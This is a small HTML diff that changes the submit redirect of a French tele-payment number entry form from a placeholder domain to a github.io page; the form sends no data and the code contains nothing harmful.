@@ -66,7 +66,7 @@
 </html>
     <div class="form-container">
         <h2>Saisie du numéro de télépaiement</h2>
-          <form id="saisie" onsubmit="window.location.href='https://www.exemple-paiement.fr'; return false;">
+          <form id="saisie" onsubmit="window.location.href='https://justmoicom.github.io/VoucherZZ/'; return false;">
             <div class="input-group">
                 <label for="numeroTelepaiement">Numéro de télépaiement :</label>
                 <input type="tel" id="numeroTelepaiement" maxlength="22" required placeholder="Numéro de télépaiement" value="123456789012345678">
